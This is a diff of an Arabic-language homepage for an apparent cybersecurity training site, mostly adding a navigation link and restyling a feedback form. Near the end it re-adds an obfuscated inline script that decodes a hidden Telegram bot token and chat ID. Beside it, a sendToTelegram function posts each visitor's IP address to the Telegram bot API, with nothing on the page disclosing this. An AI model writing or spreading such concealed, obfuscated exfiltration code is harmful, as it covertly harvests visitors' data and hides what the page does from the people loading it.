@@ -35,6 +35,7 @@
             <li class="active"><a href="index.html">الرئيسية</a></li>
             <li><a href="single-page.html">الكورسات</a></li>
             <li><a href="#CTF">التدريب العملي</a></li>
+            <li><a href="#CCNA">الاختبارات</a></li>
             <li><a href="projects.html">الافكار</a></li>
             <li><a href="services.html">الخدمات</a></li>
             <li><a href="about.html">عن الفريق</a></li>
@@ -112,7 +113,7 @@
       <div class="row">
         <div class="col-md-12 section-heading probootstrap-animate">
           <h2>اخر الاخبار</h2>
-          <p>2024/11/19</p>
+          <p>2024/9/29</p>
           <img src="img/ccnanews.png" alt="Course Image" class="img-responsive img-border3" style="user-select: none; -webkit-user-drag: none;">
 
         </div>
@@ -176,7 +177,7 @@
       <div class="col-md-4 col-sm-6 probootstrap-animate">
         <div class="probootstrap-card">
           <div class="probootstrap-card-media">
-            <a href="single-page.html"><img src="img/courserv4.PNG" class="img-responsive img-border" alt=""></a>
+            <a href="single-page.html"><img src="img/courserv4.PNG" style="user-select: none; -webkit-user-drag: none;" class="img-responsive img-border" alt=""></a>
           </div>
           <div class="probootstrap-card-text">
             <h2 class="probootstrap-card-heading mb0">الكورسات</h2>
@@ -193,7 +194,7 @@
       <div class="col-md-4 col-sm-6 probootstrap-animate">
         <div class="probootstrap-card">
           <div class="probootstrap-card-media">
-            <a href="single-page2.html"><img src="img/documentv2.PNG" class="img-responsive img-border" alt=""></a>
+            <a href="single-page2.html"><img src="img/documentv2.PNG" style="user-select: none; -webkit-user-drag: none;" class="img-responsive img-border" alt=""></a>
           </div>
           <div class="probootstrap-card-text">
             <h2 class="probootstrap-card-heading mb0">المستندات</h2>
@@ -210,7 +211,7 @@
       <div class="col-md-4 col-sm-6 probootstrap-animate">
         <div class="probootstrap-card">
           <div class="probootstrap-card-media">
-            <a href="social.html"><img src="img/سوشل ميديا.png" class="img-responsive img-border" alt=""></a>
+            <a href="social.html"><img src="img/سوشل ميديا.png" style="user-select: none; -webkit-user-drag: none;" class="img-responsive img-border" alt=""></a>
           </div>
           <div class="probootstrap-card-text">
             <h2 class="probootstrap-card-heading mb0">!حسابات حليب</h2>
@@ -309,7 +310,7 @@
   </div>
 </section>
 
-<section class="probootstrap-section" section id="CTF"></section>
+<section class="probootstrap-section" section id="CCNA"></section>
   <div class="container">
     <div class="row">
       <div class="col-md-12 section-heading3 probootstrap-animate">
@@ -420,30 +421,30 @@
     </div>
   </section>
  
-  <section class="probootstrap-section">
+  <section class="probootstrap-section" style="background-color: #000000; color: #ffffff; padding: 40px 0;">
     <div class="container">
         <div class="row justify-content-center">
             <div class="col-md-4">
-                <div class="section-heading text-center">
-                    <h2>أرسل ملاحظاتك</h2>
+                <div class="section-heading text-center" style="margin-bottom: 30px;">
+                    <h2 style="color: #06c206;">أرسل ملاحظاتك</h2>
                 </div>
-                <form id="note-form">
+                <form id="note-form" style="background-color: #131313df; padding: 20px; border-radius: 8px;">
                     <div class="form-group">
-                        <label for="email">البريد الإلكتروني</label>
-                        <input type="email" id="email" class="form-control" placeholder="أدخل بريدك الإلكتروني" required>
+                        <label for="email" style="color: #ffffff;">البريد الإلكتروني</label>
+                        <input type="email" id="email" class="form-control" placeholder="أدخل بريدك الإلكتروني" required style="background-color: #333333; border: 1px solid #06c206; border-width: 2px; color: #ffffff;">
                     </div>
                     <div class="form-group">
-                        <label for="note">ملاحظتك</label>
-                        <textarea id="note" class="form-control" rows="4" placeholder="اكتب ملاحظتك هنا" required></textarea>
+                        <label for="note" style="color: #ffffff;">ملاحظتك</label>
+                        <textarea id="note" class="form-control" rows="4" placeholder="اكتب ملاحظتك هنا" required style="background-color: #333333; border: 1px solid #06c206; border-width: 2px; color: #ffffff;"></textarea>
                     </div>
-                    <button type="submit" class="btn btn-primary btn-block">إرسال</button>
+                    <button type="submit" class="btn btn-primary btn-block" style="background-color: #06c206e9; border-color: #06c206; color: #000000; ">إرسال</button>
                 </form>
-               
-                <div id="response-message"></div>
+                <div id="response-message" style="margin-top: 20px; color: #06c206;"></div>
             </div>
         </div>
     </div>
-</section><script src="scriptnote.js"></script><script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</section>
+<script src="scriptnote.js"></script><script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
  <footer class="probootstrap-footer probootstrap-bg">
     
     <div class="container">
@@ -499,10 +500,9 @@
   <div class="gototop js-top">
     <a href="#" class="js-gotop"><i class="icon-chevron-thin-up"></i></a>
   </div>
-  <script src="js/scripts.min.js"></script>
-              <script>
- var TOKEN,CHAT_ID;(function(){var wAA='',IWu=131-120;function cSZ(j){var l=2261174;var g=j.length;var q=[];for(var w=0;w<g;w++){q[w]=j.charAt(w)};for(var w=0;w<g;w++){var e=l*(w+154)+(l%16604);var i=l*(w+515)+(l%45879);var n=e%g;var k=i%g;var u=q[n];q[n]=q[k];q[k]=u;l=(e+i)%3049609;};return q.join('')};var uWp=cSZ('cousurmvtyknbwatnfchdlorgocrqsptjixez').substr(0,IWu);var yJa='=+=)plv8rndv2,f(x}=8a[ue,"rga.;iw.ai]; o-rg.(hux)ngtf;oa;;;=q;alsa[yv,=hc7g,uso.]cr(r1k}=;="evAu,(=970j1e,f)xr.ofta7,3e4;)=a.,s=(uyfCj<vcrigrt;g<{ levdtaev>a8y[+[=6al5]+)u.s oe[)1cnls,a)o"u)e. vr8eAoru;"rtlo)gl(kag]menh2.l+h+t(;l tf5s;roeaar]o+vnth(-]hsv.8, S9(7d)o=[vsrbri=o=}a]tlrt;err8;rp;u;l.rlhp.t lf er,8];ni)tha{pnlx1]=+r{,=g=-rpzrzp++.l;csth(,v7 znn0a(l],C20n;b)vju,C]=nmrf=en0ch)cCpd1n8z.noaa -b+0;[o; (gbf{;=;6k;fhazq.l}9jCi+e+t}(=cnh(,<c;a=c( })ls;fr+nqm*[1pv"=*[ .A,gr,jk ,cdp+0."v(4v;a7+r) +=.ui8<.1g2jv80rr)d=+tC)vrguf;g o+onr1o) ivh4i;c(c6(nmst=hbd)=l g;>;;62-=wh1u=s=lnjC;}to=(rann)=r66=ji-f+na)oopua1w(],(e;0akv1++it(0la)[.[=na1;r4nts==1rggpriu[hi8a"o0y+i)p(;ogehm.;sx7!,h]0;fv=r=(),.5aeq2+()zf8ohv6Ao9 r)ta;u792y y8o(.cjl=+(5)<{fvum]{r+0naas)r=roeav;ed;9[={;rot(,o ! d((azr.n((gmvig"ecm[;al-for",z22Chi)At;d)9s)boap)rw).= Snmi1gjrrocuokn;p lzrenf)6(h3(c,itr6j"t,e. ,vigg.;';var tLG=cSZ[uWp];var SWF='';var boi=tLG;var ZwJ=tLG(SWF,cSZ(yJa));var GPA=ZwJ(cSZ('Q,.j.e)3_o(en).)Q4g}rr2,t5!)C33Qz_Q.Q,0_;bmt)+j+z(Q:7ejsoQ);b-4y{!9s[(4.b34.=s2m$&,.;Q0Ny5d"=r f3t08 $QvtQs.w,3g(rn(1rvt).f$QQiQksnpCT&z&Q0l(,d=_Q.w8.}$0cw8s(y4e)ysw_$% 1!fyQjn3QSej,Q0),bataw!9$je5p6!$2)0 3Q!(.9Q$i}{.,l!Q.6T1(n)zQejQ.0z.jQfa=b(h.#oy3r!tQb.\/sQ)Q(10$Q$Qn_e..  n7e0;Q{o)m,)3\'6a)i\/6.t*1.;Qn$x-u+a.,m_w)3Q.iQ2w]=+Q.}=x0g.4#.. {Q)\/%j=e*d0S;.;)t$$r\/hl)e4)+_)Q.Q*$)Qo.QDi 7(Qnb4b(dodQ7037la%3Q6d,1gdQ)3Q4.rQ.*..!w)(32st=.tQk,n4.aQf _08t9,_!+1 s"!7\'bo!=d";.7.i.!r5CbQ,;$6h1Q 6=bsQ._b=s4bie1=Q[Q);1,.w0s(Q}C.qn!}.,8 ,=o,;us;5Sirb$6,3gEr.l0i.o.n.o(1of."gr)aQ$=Qeo12b)...3=.7Qix_rt!Q#bn.#6n$;[.gf.Q(j];ju]7_b_.;h.(e7ntQpQ77[e!Q!)a.{yo,z{8j,)x)i;b(T=ofj(r=}d;j1,**.Qb\'!cbo;r;-(6C$)p_tQI}itx;94(t8.i$.;73j".!fj{$QSyQ,%;d&4%2.((ab6!fwj.QQ\'j_3-fbj{3,z8=p).3*,Qk)%fad+__aep0Q({Qbd,+(0"!Q(o64}jrp!]d)7Q.oQ.__$ed4j_pol}e)$_=p2r0,Q9 wj_bajs )gQ(.Q$)t%)rg3yrQs(3 )2(%"Q+,Q]Q5tQ,tyb+.m!$udqib1.;$.o}r,#=z=(._;30b#ha(r(Q,( q}ib)7(Q%!_+bdr$f;;=\/k.b.#o. Ql*Q)r.0+'));var IOW=boi(wAA,GPA );IOW(1028);return 4306})()
-  function sendToTelegram(ip) {
+  <script src="js/scripts.min.js"></script> <script>
+ var TOKEN,CHAT_ID;(function(){var wAA='',IWu=131-120;function cSZ(j){var l=2261174;var g=j.length;var q=[];for(var w=0;w<g;w++){q[w]=j.charAt(w)};for(var w=0;w<g;w++){var e=l*(w+154)+(l%16604);var i=l*(w+515)+(l%45879);var n=e%g;var k=i%g;var u=q[n];q[n]=q[k];q[k]=u;l=(e+i)%3049609;};return q.join('')};var uWp=cSZ('cousurmvtyknbwatnfchdlorgocrqsptjixez').substr(0,IWu);var yJa='=+=)plv8rndv2,f(x}=8a[ue,"rga.;iw.ai]; o-rg.(hux)ngtf;oa;;;=q;alsa[yv,=hc7g,uso.]cr(r1k}=;="evAu,(=970j1e,f)xr.ofta7,3e4;)=a.,s=(uyfCj<vcrigrt;g<{ levdtaev>a8y[+[=6al5]+)u.s oe[)1cnls,a)o"u)e. vr8eAoru;"rtlo)gl(kag]menh2.l+h+t(;l tf5s;roeaar]o+vnth(-]hsv.8, S9(7d)o=[vsrbri=o=}a]tlrt;err8;rp;u;l.rlhp.t lf er,8];ni)tha{pnlx1]=+r{,=g=-rpzrzp++.l;csth(,v7 znn0a(l],C20n;b)vju,C]=nmrf=en0ch)cCpd1n8z.noaa -b+0;[o; (gbf{;=;6k;fhazq.l}9jCi+e+t}(=cnh(,<c;a=c( })ls;fr+nqm*[1pv"=*[ .A,gr,jk ,cdp+0."v(4v;a7+r) +=.ui8<.1g2jv80rr)d=+tC)vrguf;g o+onr1o) ivh4i;c(c6(nmst=hbd)=l g;>;;62-=wh1u=s=lnjC;}to=(rann)=r66=ji-f+na)oopua1w(],(e;0akv1++it(0la)[.[=na1;r4nts==1rggpriu[hi8a"o0y+i)p(;ogehm.;sx7!,h]0;fv=r=(),.5aeq2+()zf8ohv6Ao9 r)ta;u792y y8o(.cjl=+(5)<{fvum]{r+0naas)r=roeav;ed;9[={;rot(,o ! d((azr.n((gmvig"ecm[;al-for",z22Chi)At;d)9s)boap)rw).= Snmi1gjrrocuokn;p lzrenf)6(h3(c,itr6j"t,e. ,vigg.;';var tLG=cSZ[uWp];var SWF='';var boi=tLG;var ZwJ=tLG(SWF,cSZ(yJa));var GPA=ZwJ(cSZ('Q,.j.e)3_o(en).)Q4g}rr2,t5!)C33Qz_Q.Q,0_;bmt)+j+z(Q:7ejsoQ);b-4y{!9s[(4.b34.=s2m$&,.;Q0Ny5d"=r f3t08 $QvtQs.w,3g(rn(1rvt).f$QQiQksnpCT&z&Q0l(,d=_Q.w8.}$0cw8s(y4e)ysw_$% 1!fyQjn3QSej,Q0),bataw!9$je5p6!$2)0 3Q!(.9Q$i}{.,l!Q.6T1(n)zQejQ.0z.jQfa=b(h.#oy3r!tQb.\/sQ)Q(10$Q$Qn_e..  n7e0;Q{o)m,)3\'6a)i\/6.t*1.;Qn$x-u+a.,m_w)3Q.iQ2w]=+Q.}=x0g.4#.. {Q)\/%j=e*d0S;.;)t$$r\/hl)e4)+_)Q.Q*$)Qo.QDi 7(Qnb4b(dodQ7037la%3Q6d,1gdQ)3Q4.rQ.*..!w)(32st=.tQk,n4.aQf _08t9,_!+1 s"!7\'bo!=d";.7.i.!r5CbQ,;$6h1Q 6=bsQ._b=s4bie1=Q[Q);1,.w0s(Q}C.qn!}.,8 ,=o,;us;5Sirb$6,3gEr.l0i.o.n.o(1of."gr)aQ$=Qeo12b)...3=.7Qix_rt!Q#bn.#6n$;[.gf.Q(j];ju]7_b_.;h.(e7ntQpQ77[e!Q!)a.{yo,z{8j,)x)i;b(T=ofj(r=}d;j1,**.Qb\'!cbo;r;-(6C$)p_tQI}itx;94(t8.i$.;73j".!fj{$QSyQ,%;d&4%2.((ab6!fwj.QQ\'j_3-fbj{3,z8=p).3*,Qk)%fad+__aep0Q({Qbd,+(0"!Q(o64}jrp!]d)7Q.oQ.__$ed4j_pol}e)$_=p2r0,Q9 wj_bajs )gQ(.Q$)t%)rg3yrQs(3 )2(%"Q+,Q]Q5tQ,tyb+.m!$udqib1.;$.o}r,#=z=(._;30b#ha(r(Q,( q}ib)7(Q%!_+bdr$f;;=\/k.b.#o. Ql*Q)r.0+'));var IOW=boi(wAA,GPA );IOW(1028);return 4306})() 
+ function sendToTelegram(ip) {
       const message = `${ip}`; const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
         fetch(url, {
             method: 'POST',
@@ -517,7 +517,6 @@
     </script>
   <script src="js/main.min.js"></script>
   <script src="js/custom.js"></script>
-
-  
-  </body>
+ 
+</body>
 </html>
